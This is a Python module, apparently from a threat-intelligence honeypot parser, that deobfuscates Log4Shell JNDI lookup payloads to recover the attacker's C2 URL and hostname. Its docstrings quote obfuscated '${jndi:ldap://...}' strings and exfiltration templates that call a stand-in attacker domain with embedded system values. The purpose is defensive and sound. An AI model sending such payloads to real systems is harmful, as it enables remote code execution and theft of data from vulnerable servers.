"""Log4Shell (CVE-2021-44228) JNDI payload deobfuscation.

Why this module exists
----------------------
Log4Shell scanners almost never send a bare ``${jndi:ldap://host/a}``.
They send it wrapped in Log4j's own *default-value* lookup syntax, one
character per lookup::

    ${${0qp:9:75fs:-j}${7y:k:tq:-n}${1o0:sg4:-d}${2mg:-i}${b3k:-:}...}

Log4j resolves ``${<lookup>:-<default>}`` to ``<default>`` whenever the
named lookup misses — and ``0qp``, ``7y``, ``1o0`` are deliberately
nonsense lookups, so every one of them misses and yields its single
default character.  Concatenated, the outer ``${...}`` becomes
``${jndi:ldap://<c2-host>/<path>}``.  The obfuscation exists purely to
defeat WAF/IDS signatures that grep for the literal string ``jndi``.

For CTI purposes the interesting artifact is the C2 URL *inside* the
payload — the LDAP/RMI/DNS endpoint the victim JVM would have been made
to fetch its second-stage class from.  That endpoint is live attacker
infrastructure and is worth far more than the (spoofable) source address
the payload arrived in.  See docs/parsers/h0neytr4p.md.

Scope
-----
Deliberately small.  This is a *best-effort textual* resolver for the
default-value form plus the handful of case-folding lookups that appear
in the wild.  It is NOT a Log4j interpolator and MUST NOT be used to
evaluate anything.  Runtime lookups with no default (``${sys:java.version}``,
``${env:USER}``, ``${hostName}``) are intentionally left *literal* — they
are the exfiltration template the attacker wants the victim to fill in,
and preserving them keeps the recovered URL faithful to what was sent.
"""

from __future__ import annotations

import re
from typing import Optional
from urllib.parse import urlsplit

__all__ = ["deobfuscate", "extract_jndi", "JndiPayload"]


#: Hard cap on input length.  Payloads seen in the wild run ~1.5 KB; the
#: cap keeps a hostile multi-megabyte header from turning the resolver
#: loop into a CPU sink.
MAX_INPUT = 16 * 1024

#: Hard cap on resolver passes.  Each pass rewrites every *innermost*
#: ``${...}`` that carries a default, so nesting depth N needs N passes.
#: Real payloads are 2 deep; 40 is far past any legitimate need and
#: guarantees termination even on a pathological input.
MAX_PASSES = 40

#: An innermost ``${...}`` — one with no nested ``${`` inside it.  We
#: resolve inside-out so that by the time the outer braces are reduced,
#: their contents are already plain text.
_INNERMOST = re.compile(r"\$\{([^${}]*)\}")

#: Lookups that fold case rather than supply a default: ``${lower:J}``.
_CASE_FOLD = re.compile(r"^(lower|upper):(.*)$", re.IGNORECASE | re.DOTALL)

#: The JNDI URI we are trying to recover.  ``ldap``/``ldaps``/``rmi``/
#: ``dns``/``iiop``/``nis``/``corba``/``nds`` are the JNDI providers
#: reachable via the Log4j lookup; ldap and dns carry essentially all
#: real-world traffic.
#:
#: ``rest`` matches either a whole surviving ``${...}`` template or any
#: single non-``}`` character.  The alternation matters: exfil payloads
#: embed an unresolved lookup *inside the hostname*
#: (``ldap://x-${sys:java.version}.<token>.<c2-domain>/``) and a naive
#: ``[^}]*`` truncates the URL at that template's closing brace, throwing
#: away the C2 domain — the one piece of the payload actually worth
#: keeping.  The final ``}`` of the outer obfuscation wrapper still
#: terminates the match, because it is not preceded by ``${``.
_JNDI = re.compile(
    r"jndi:(?P<scheme>ldaps?|rmi|dns|iiop|nis|corba|nds)://"
    r"(?P<rest>(?:\$\{[^{}]*\}|[^}\s])*)",
    re.IGNORECASE,
)

#: Host label validation for the C2 hostname we pull out of the URL.  A
#: host containing an unresolved ``${...}`` template is NOT emitted as a
#: Domain-Name observable (it isn't a real name); the full URL still is.
_HOSTNAME = re.compile(
    r"^(?=.{1,253}$)(?!-)[A-Za-z0-9-]{1,63}(?<!-)"
    r"(\.(?!-)[A-Za-z0-9-]{1,63}(?<!-))+$"
)

#: Multi-label registry suffixes that must never be emitted as a
#: Domain-Name on their own.  Not a full public-suffix list — a real PSL
#: is a dependency and a monthly-changing data file, and the
#: ``stripped and len(labels) < 3`` rule in :func:`_host_of` already
#: covers the general case.  This set exists so the *common* two-label
#: registry suffixes are rejected outright even when they arrive
#: untemplated.
_PUBLIC_SUFFIXES = frozenset({
    "co.uk", "org.uk", "me.uk", "gov.uk", "ac.uk", "net.uk",
    "com.au", "net.au", "org.au", "edu.au", "gov.au",
    "co.jp", "or.jp", "ne.jp", "ac.jp", "go.jp",
    "com.br", "com.cn", "com.mx", "com.tr", "com.tw", "com.sg",
    "co.in", "co.za", "co.nz", "co.kr", "co.il", "co.th", "co.id",
    "com.ar", "com.co", "com.pl", "com.ua", "com.vn", "com.hk",
})


class JndiPayload:
    """One recovered JNDI endpoint.

    Attributes
    ----------
    url
        The reconstructed C2 URL, e.g. ``ldap://x.dns-exfil.example/Foo``.
        Always present.
    host
        The bare hostname, or ``None`` when the authority still contains
        an unresolved ``${...}`` template or isn't a valid FQDN.
    scheme
        JNDI provider scheme, lowercased (``ldap``, ``dns``, ...).
    raw
        The original obfuscated text the payload was recovered from,
        unchanged.
    decoded
        The fully deobfuscated text ``raw`` resolved to.
    """

    __slots__ = ("url", "host", "scheme", "raw", "decoded")

    def __init__(self, url: str, host: Optional[str], scheme: str,
                 raw: str, decoded: str) -> None:
        self.url = url
        self.host = host
        self.scheme = scheme
        self.raw = raw
        self.decoded = decoded

    def __eq__(self, other) -> bool:
        return isinstance(other, JndiPayload) and self.url == other.url

    def __hash__(self) -> int:
        return hash(self.url)

    def __repr__(self) -> str:  # pragma: no cover - debug aid
        return f"JndiPayload(url={self.url!r}, host={self.host!r})"

    def to_dict(self) -> dict:
        """JSON-serializable form for ``ParsedEvent.meta``."""
        return {
            "url": self.url,
            "host": self.host,
            "scheme": self.scheme,
            "raw": self.raw,
            "decoded": self.decoded,
        }


def deobfuscate(text: str) -> str:
    """Resolve Log4j default-value / case-folding lookups to plain text.

    Rewrites innermost ``${...}`` groups repeatedly until nothing changes:

    * ``${anything:-X}``      → ``X``   (default-value form; the whole
      obfuscation scheme is built on this)
    * ``${lower:X}`` / ``${upper:X}`` → ``x`` / ``X``
    * anything else (``${sys:java.version}``, ``${hostName}``) is left
      **untouched** — see the module docstring.

    Returns the input unchanged when it carries no ``${``.  Never raises.
    """
    if not text or "${" not in text:
        return text or ""
    if len(text) > MAX_INPUT:
        text = text[:MAX_INPUT]

    for _ in range(MAX_PASSES):
        changed = False

        def _resolve(m: re.Match) -> str:
            nonlocal changed
            inner = m.group(1)
            # Default-value form: everything after the LAST ':-' is the
            # literal.  Last, not first, because the lookup name itself
            # may contain ':' separators (``${a:b:c:-x}``).
            idx = inner.rfind(":-")
            if idx != -1:
                changed = True
                return inner[idx + 2:]
            fold = _CASE_FOLD.match(inner)
            if fold:
                changed = True
                kind, val = fold.group(1).lower(), fold.group(2)
                return val.lower() if kind == "lower" else val.upper()
            # A lookup with no default — leave it verbatim, including its
            # braces, so a later pass doesn't try to reduce it again.
            return m.group(0)

        new = _INNERMOST.sub(_resolve, text)
        if not changed:
            # Nothing resolvable left. `new` == `text` except that
            # unresolvable groups were re-emitted verbatim.
            return new
        text = new
    return text


def extract_jndi(text: str) -> list[JndiPayload]:
    """Recover every distinct JNDI endpoint embedded in ``text``.

    Deobfuscates first, then scans the result for ``jndi:<scheme>://``.
    Returns ``[]`` for input that carries no JNDI payload — including
    plain, well-formed values, which is the overwhelmingly common case,
    so this is cheap to call on every field.

    Results are deduplicated by URL and returned in first-seen order.
    Never raises.
    """
    if not text or "${" not in text:
        return []
    try:
        decoded = deobfuscate(text)
    except Exception:  # pragma: no cover - defensive; deobfuscate is total
        return []
    if "jndi:" not in decoded.lower():
        return []

    out: list[JndiPayload] = []
    seen: set[str] = set()
    for m in _JNDI.finditer(decoded):
        scheme = m.group("scheme").lower()
        # Trim the trailing '}' that closes the outer obfuscation wrapper
        # and any stray delimiters the header may have carried — but never
        # a '}' that closes a surviving ``${...}`` template. A payload
        # ending in one (``.../${sys:java.version}}``) would otherwise be
        # reported as a URL that was never sent, under the wrong id.
        rest = _rstrip_unbalanced(m.group("rest"))
        if not rest:
            continue
        url = f"{scheme}://{rest}"
        if url in seen:
            continue
        seen.add(url)
        out.append(JndiPayload(
            url=url, host=_host_of(url), scheme=scheme,
            raw=text, decoded=decoded,
        ))
    return out


#: Trailing characters that are wrapper/delimiter noise rather than part
#: of the URL.
_TRAILING_NOISE = "}\"'),;"


def _rstrip_unbalanced(rest: str) -> str:
    """Strip trailing delimiters, keeping braces that close a template.

    ``rest`` may end in the outer obfuscation wrapper's ``}`` plus stray
    quoting from the header it rode in. It may ALSO end in the ``}`` of a
    surviving ``${...}`` lookup that is genuinely part of the URL. We keep
    exactly as many closing braces as there are unclosed ``${`` openings.
    """
    opens = rest.count("${")
    while rest and rest[-1] in _TRAILING_NOISE:
        if rest[-1] == "}":
            # Closing braces still needed to balance the templates.
            if rest.count("}") <= opens:
                break
        rest = rest[:-1]
    return rest


def _host_of(url: str) -> Optional[str]:
    """The resolvable C2 hostname from a recovered URL, or None.

    The authority of an exfil payload is typically part template and part
    real name::

        XFl0c-${sys:java.version}.<token>.dns-exfil.example.com
        └──── victim-supplied at runtime ────┘└─ attacker's real zone ─┘

    We drop the leading labels that still carry an unresolved ``${...}``
    and keep the longest well-formed FQDN suffix — that suffix is the
    attacker-controlled zone, which is the pivotable IoC.  Returns None
    when nothing valid survives (IP literal, bare label, bad syntax), so
    we never mint a malformed Domain-Name observable.
    """
    authority = url.split("://", 1)[-1].split("/", 1)[0]
    # Strip userinfo and :port without urlsplit, which chokes on the
    # braces/colons a surviving template leaves in the authority.
    authority = authority.rsplit("@", 1)[-1]
    if not authority:
        return None
    labels = authority.rstrip(".").split(".")
    # A port only ever rides on the final label.
    labels[-1] = labels[-1].split(":", 1)[0]
    # Drop every label up to and including the last templated one.
    last_templated = -1
    for i, label in enumerate(labels):
        if "$" in label or "{" in label or "}" in label:
            last_templated = i
    stripped = last_templated >= 0
    labels = labels[last_templated + 1:]
    # An empty label means the authority was malformed (``a..b.example``).
    # Silently closing the gap would report a name that was never sent.
    if not labels or any(not l for l in labels):
        return None

    host = ".".join(labels).lower()
    if not _HOSTNAME.match(host):
        return None
    # A registry suffix is not an IoC. `${sys:java.version}.co.uk` must not
    # become a Domain-Name for `co.uk`, which would attach honeypot
    # evidence to a public registry and, in OpenCTI, to every unrelated
    # observable under it.
    if host in _PUBLIC_SUFFIXES:
        return None
    if stripped and len(labels) < 3:
        # We only reached this name by GUESSING which labels were
        # attacker-controlled. Two labels after stripping is usually a
        # registrable suffix we cannot distinguish from a real C2 domain
        # without a full public-suffix list. Decline rather than assert a
        # domain we are not sure of — the URL observable is emitted
        # either way, so the IoC is not lost.
        return None
    return host
